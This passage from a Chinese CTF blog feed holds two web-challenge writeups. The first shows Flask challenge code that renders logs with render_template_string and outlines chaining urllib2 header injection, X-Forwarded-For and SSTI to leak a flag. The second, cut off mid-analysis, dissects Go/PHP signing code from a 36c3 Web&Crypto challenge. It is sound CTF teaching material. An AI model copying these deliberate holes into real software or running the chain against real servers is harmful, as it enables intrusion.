class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, render_template_string, request, redirect, abort, Blueprint</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlparse</span><br><span class="line"></span><br><span class="line">front = Blueprint(<span class="string">"renderer"</span>, __name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    print(request.url)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route("/", methods=["GET", "POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">"GET"</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>)</span><br><span class="line">    </span><br><span class="line">    url = request.form.get(<span class="string">"url"</span>)</span><br><span class="line">    res = proxy_read(url) <span class="keyword">if</span> url <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">        abort(<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>, data = res)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route("/whatismyip", methods=["GET"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ipcheck</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"ip.html"</span>, ip = get_ip(), real_ip = get_real_ip())</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route("/admin", methods=["GET"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_access</span><span class="params">()</span>:</span></span><br><span class="line">    ip = get_ip()</span><br><span class="line">    rip = get_real_ip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">"127.0.0.1"</span>, <span class="string">"127.0.0.2"</span>]: <span class="comment">#super private ip :)</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip != rip: <span class="comment">#if use proxy</span></span><br><span class="line">        ticket = write_log(rip)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"admin_remote.html"</span>, ticket = ticket)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> ip == <span class="string">"127.0.0.2"</span> <span class="keyword">and</span> request.args.get(<span class="string">"body"</span>):</span><br><span class="line">            ticket = write_extend_log(rip, request.args.get(<span class="string">"body"</span>))</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"admin_local.html"</span>, ticket = ticket)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"admin_local.html"</span>, ticket = <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route("/admin/ticket", methods=["GET"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_ticket</span><span class="params">()</span>:</span></span><br><span class="line">    ip = get_ip()</span><br><span class="line">    rip = get_real_ip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip != rip: <span class="comment">#proxy doesn't allow to show ticket</span></span><br><span class="line">        <span class="keyword">print</span> <span class="number">1</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">"127.0.0.1"</span>, <span class="string">"127.0.0.2"</span>]: <span class="comment">#only local</span></span><br><span class="line">        <span class="keyword">print</span> <span class="number">2</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> request.headers.get(<span class="string">"User-Agent"</span>) != <span class="string">"AdminBrowser/1.337"</span>:</span><br><span class="line">        <span class="keyword">print</span> request.headers.get(<span class="string">"User-Agent"</span>)</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">"ticket"</span>):</span><br><span class="line">        log = read_log(request.args.get(<span class="string">"ticket"</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> log:</span><br><span class="line">            <span class="keyword">print</span> <span class="number">4</span></span><br><span class="line">            abort(<span class="number">403</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(log)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> request.remote_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_real_ip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> request.headers.get(<span class="string">"X-Forwarded-For"</span>) <span class="keyword">or</span> get_ip()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proxy_read</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="comment">#TODO : implement logging</span></span><br><span class="line">    </span><br><span class="line">    s = urlparse(url).scheme</span><br><span class="line">    <span class="keyword">if</span> s <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">"http"</span>, <span class="string">"https"</span>]: <span class="comment">#sjgdmfRk akfRk</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> urllib2.urlopen(url).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_log</span><span class="params">(rip)</span>:</span></span><br><span class="line">    tid = hashlib.sha1(str(time.time()) + rip).hexdigest()</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"/home/tickets/%s"</span> % tid, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        log_str = <span class="string">"Admin page accessed from %s"</span> % rip</span><br><span class="line">        f.write(log_str)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> tid</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_extend_log</span><span class="params">(rip, body)</span>:</span></span><br><span class="line">    tid = hashlib.sha1(str(time.time()) + rip).hexdigest()</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"/home/tickets/%s"</span> % tid, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(body)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tid</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_log</span><span class="params">(ticket)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (ticket <span class="keyword">and</span> ticket.isalnum()):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> path.exists(<span class="string">"/home/tickets/%s"</span> % ticket):</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">"/home/tickets/%s"</span> % ticket, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">return</span> f.read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>可以发现我们 flag 在 config 中，想到 SSTI。</p><p>题目还提供了一个类似 SSRF 的功能，让服务器帮我们去请求，这里用的是 <code>urllib2.urlopen(url)</code>，这里存在 http 头注入的问题。</p><p>再看一下 admin 接口，会把 rip，也就是 xff 头写到日志里，我们可以通过 /admin/ticket 接口来访问日志（当然我们有了目录遍历，也可以直接下载）</p><p>如何才能 SSTI 呢，当访问 /admin/ticket 接口时会把日志结果用 <code>render_template_string</code>渲染，所以我们的思路很清楚了：把 SSTI payload 先放到 xff 头里，访问 admin 接口把 payload 写到日志里，再去访问 /admin/ticket 接口实现 SSTI，头部控制可以利用 urllib 的 HTTP 注入。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>首先请求 /admin:</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-6a5358e38937fa6e.png" alt="image.png"></p><p>得到 ticket，再请求 /admin/ticket：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-6f4b3bcd8936cf22.png" alt="image.png"></p><p>参考：</p><ol><li><p><a href="https://ctftime.org/writeup/18264" target="_blank" rel="noopener">https://ctftime.org/writeup/18264</a></p></li><li><p><a href="https://blog.rwx.kr/codegate-ctf-2020-preliminary/#csp" target="_blank" rel="noopener">https://blog.rwx.kr/codegate-ctf-2020-preliminary/#csp</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>36c3 一道Web&amp;Crypto题</title>
      <link href="/2020/01/08/36c3%E4%B8%80%E9%81%93Web-Crypto%E9%A2%98/"/>
      <url>/2020/01/08/36c3%E4%B8%80%E9%81%93Web-Crypto%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>36c3 的时候看了很久<code>SaV-ls-l-aaS</code>这道题也没有做出来，这道题的分类是Web&amp;Crypto，赛后看了题解感觉题的质量很高，出的很巧妙的一道题，这里记录一下。</p><a id="more"></a><p>首先捋一下流程：</p><p>60601端口开着一个Web服务，题目描述给了连接方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="string">'http://78.47.240.226:60601'</span> &amp;&amp; ip=$(curl -s <span class="string">"<span class="variable">$url</span>/ip"</span>) &amp;&amp; sig=$(curl -s -d <span class="string">"cmd=ls -l&amp;ip=<span class="variable">$ip</span>"</span> <span class="string">"<span class="variable">$url</span>/sign"</span>) &amp;&amp; curl --data-urlencode <span class="string">"signature=<span class="variable">$sig</span>"</span> <span class="string">"<span class="variable">$url</span>/exec"</span></span><br></pre></td></tr></table></figure><p>可以看到，先是访问 <code>/ip</code> 得到 ip，再向 <code>/sign</code> post 过去 ip 和我们要执行的命令，得到签名，最后向 <code>/exec</code> post signature 来执行命令。我们执行这一行可以发现回显了<code>ls -l</code>执行的结果，发现有个 flag.txt。</p><p>看源码，Web 服务是由 go 起的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"bytes"</span></span><br><span class="line"><span class="string">"crypto/sha1"</span></span><br><span class="line"><span class="string">"encoding/json"</span></span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"io"</span></span><br><span class="line"><span class="string">"io/ioutil"</span></span><br><span class="line"><span class="string">"log"</span></span><br><span class="line"><span class="string">"net"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line"><span class="string">"strings"</span></span><br><span class="line"><span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">m := http.NewServeMux()</span><br><span class="line"></span><br><span class="line">m.HandleFunc(<span class="string">"/ip"</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">ip, _, err := net.SplitHostPort(r.RemoteAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Fprint(w, ip)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">m.HandleFunc(<span class="string">"/sign"</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">ip, _, err := net.SplitHostPort(r.RemoteAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">remoteAddr := net.ParseIP(ip)</span><br><span class="line"><span class="keyword">if</span> remoteAddr == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ip = r.PostFormValue(<span class="string">"ip"</span>)</span><br><span class="line">signIP := net.ParseIP(ip)</span><br><span class="line"><span class="keyword">if</span> signIP == <span class="literal">nil</span> || !signIP.Equal(remoteAddr) &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">"lol, not ip :&gt;"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cmd := r.PostFormValue(<span class="string">"cmd"</span>)</span><br><span class="line"><span class="keyword">if</span> cmd != <span class="string">"ls -l"</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">"lol, nope :&gt;"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">msg := ip + <span class="string">"|"</span> + cmd</span><br><span class="line">digest := sha1.Sum([]<span class="keyword">byte</span>(msg))</span><br><span class="line"></span><br><span class="line">b := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">err = json.NewEncoder(b).Encode(<span class="keyword">string</span>(digest[:]))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp, err := http.Post(<span class="string">"http://127.0.0.1/index.php?action=sign"</span>, <span class="string">"application/json; charset=utf-8"</span>, b)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> || resp.StatusCode != <span class="number">200</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">"oops, hsm is down"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">"oops, hsm is bodyless?"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> signature <span class="keyword">string</span></span><br><span class="line">err = json.Unmarshal(body, &amp;signature)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">"oops, hsm is jsonless?"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Fprint(w, signature+msg)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">m.HandleFunc(<span class="string">"/exec"</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">ip, _, err := net.SplitHostPort(r.RemoteAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">remoteAddr := net.ParseIP(ip)</span><br><span class="line"><span class="keyword">if</span> remoteAddr == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signature := r.PostFormValue(<span class="string">"signature"</span>)</span><br><span class="line">digest := sha1.Sum([]<span class="keyword">byte</span>(signature[<span class="number">172</span>:]))</span><br><span class="line"></span><br><span class="line">b := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">err = json.NewEncoder(b).Encode(signature[:<span class="number">172</span>] + <span class="keyword">string</span>(digest[:]))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">"oops, json encode"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp, err := http.Post(<span class="string">"http://127.0.0.1/index.php?action=verify"</span>, <span class="string">"application/json; charset=utf-8"</span>, b)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> || resp.StatusCode != <span class="number">200</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">"oops, hsm is down?"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">"oops, hsm is bodyless?"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> valid <span class="keyword">bool</span></span><br><span class="line">err = json.Unmarshal(body, &amp;valid)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">"oops, json unmarshal"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> valid &#123;</span><br><span class="line">t := strings.Split(signature[<span class="number">172</span>:], <span class="string">"|"</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(t) != <span class="number">2</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">"oops, split"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signIP := net.ParseIP(t[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> signIP == <span class="literal">nil</span> || !signIP.Equal(remoteAddr) &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">"lol, not ip :&gt;"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">conn, err := net.DialTimeout(<span class="string">"tcp"</span>, <span class="string">"127.0.0.1:1024"</span>, <span class="number">1</span>*time.Second)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">"oops, dial"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Fprintf(conn, t[<span class="number">1</span>]+<span class="string">"\n"</span>)</span><br><span class="line">conn.(*net.TCPConn).CloseWrite()</span><br><span class="line">io.Copy(w, conn)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">s := &amp;http.Server&#123;</span><br><span class="line">Addr:           <span class="string">":60601"</span>,</span><br><span class="line">Handler:        m,</span><br><span class="line">ReadTimeout:    <span class="number">5</span> * time.Second,</span><br><span class="line">WriteTimeout:   <span class="number">5</span> * time.Second,</span><br><span class="line">MaxHeaderBytes: <span class="number">1</span> &lt;&lt; <span class="number">20</span>,</span><br><span class="line">&#125;</span><br><span class="line">log.Fatal(s.ListenAndServe())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码很容易看，限制了 cmd 只能是<code>ls -l</code>，其余不给签名，看样子我们是要伪造其他命令的签名来读flag，这里注意到签名和验签的过程是传给本地起的一个 php 来完成的，看一下这部分源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">'ALGO'</span>, <span class="string">'md5WithRSAEncryption'</span>);</span><br><span class="line">$d = json_decode(file_get_contents(<span class="string">'php://input'</span>), JSON_THROW_ON_ERROR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'action'</span>] === <span class="string">'sign'</span>)&#123;</span><br><span class="line">    $pkeyid = openssl_pkey_get_private(<span class="string">"file:///var/www/private_key.pem"</span>);</span><br><span class="line">    openssl_sign($d, $signature, $pkeyid, ALGO);</span><br><span class="line"><span class="keyword">echo</span> json_encode(base64_encode($signature));</span><br><span class="line">    openssl_free_key($pkeyid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($_GET[<span class="string">'action'</span>] === <span class="string">'verify'</span>) &#123;</span><br><span class="line">    $pkeyid = openssl_pkey_get_public(<span class="string">"file:///var/www/public_key.pem"</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(openssl_verify(substr($d, <span class="number">172</span>), base64_decode(substr($d,<span class="number">0</span>, <span class="number">172</span>)), $pkeyid, ALGO) === <span class="number">1</span>);</span><br><span class="line">    openssl_free_key($pkeyid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>采用的是<code>md5WithRSAEncryption</code>的方式签名，本地试了一下，是把我们传入的 <code>$d</code> md5 后转为hex，填充到<code>0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff003020300c06082a864886f70d020505000410</code>后面，组成数字然后用RSA签名。</p><p>看样子整个逻辑找不到一点问题，用的都是标准库，基本无法攻击。我初步的想法是通过代理更换 ip，可以拿到两个 ip|ls -l 的签名，这样我们就拥有了两组 RSA 的 m 和 c，因为题目给了 dockerfile 给了生成公私钥的方法，使用 openssl 默认生成，e为65537，那么我们可以通过求公因数的方式来求出 n。</p><p>在得到两组签名后，我们要得到 RSA 的m，就是填充后的数，所以按照代码逻辑，在 go 里面先是 sha1:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msg := ip + <span class="string">"|"</span> + cmd</span><br><span class="line">digest := sha1.Sum([]<span class="keyword">byte</span>(msg))</span><br><span class="line"></span><br><span class="line">b := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">err = json.NewEncoder(b).Encode(<span class="keyword">string</span>(digest[:]))</span><br></pre></td></tr></table></figure><p>再 php 里的 md5，得到两组 m 和 c，但是总是求不出公因数 n，怀疑我们求的 m 不对。看代码发现 go 里把 sha1的结果用 json 编码，然后传到 php里 json 解码。这部分非常可疑，为何要用 json 编码（用 hex 传过去它不香么），所以本地搭一下环境跟一下（题目给了dockerfile）</p><p>起一个docker，改一下 index.php，加一个<code>var_dump($d);</code>，再改一下 go，返回一下 php 的结果：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmt.Fprintln(w,<span class="keyword">string</span>(body))</span><br></pre></td></tr></table></figure><p>现在让程序签名，返回结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string(38) &quot;��.���?-�KC��@�&quot;</span><br><span class="line">&quot;K4FEmxz4yuTsjDAbRZQmHJ+MBiCSGaOnpZTLbThXpCkDYe3siAIPfihX6ppjN2Tz6XqOr4tF\/u1\/+ccfhj8NNLIL+2hknyDXbosmMBV8mEGYsMqQHAE0f+3OhDWlzN5RnteSMYNZbTipFErB8ZOWCiXmynWxsqJhyaN9J6\/\/h6I=&quot;</span><br><span class="line">oops, hsm is jsonless?</span><br></pre></td></tr></table></figure><p>$d 竟然是长度为 38 的字符串，看来果然是这里编码有问题，我们需要看一下每个步骤的结果，先看一下 go 里 json编码后的 sha1 结果是什么：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"bytes"</span></span><br><span class="line"><span class="string">"crypto/sha1"</span></span><br><span class="line"><span class="string">"encoding/json"</span></span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">msg := <span class="string">"172.17.0.1|ls -l"</span></span><br><span class="line">digest := sha1.Sum([]<span class="keyword">byte</span>(msg))</span><br><span class="line"></span><br><span class="line">b := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">json.NewEncoder(b).Encode(<span class="keyword">string</span>(digest[:]))</span><br><span class="line">fmt.Print(<span class="keyword">string</span>(b.Bytes()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\u000e\t\u001d\ufffd\u0012\ufffd.\ufffd\ufffd\ufffd?-\ufffdKC\ufffd\u0005\ufffd@\ufffd&quot;</span><br></pre></td></tr></table></figure><p>和正常的sha1的结果来比较一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Python 2.7.16 (default, Sep  2 2019, 11:59:44)</span><br><span 